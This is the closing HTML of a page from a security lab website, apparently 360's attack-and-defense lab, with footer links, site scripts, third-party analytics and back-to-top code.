+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
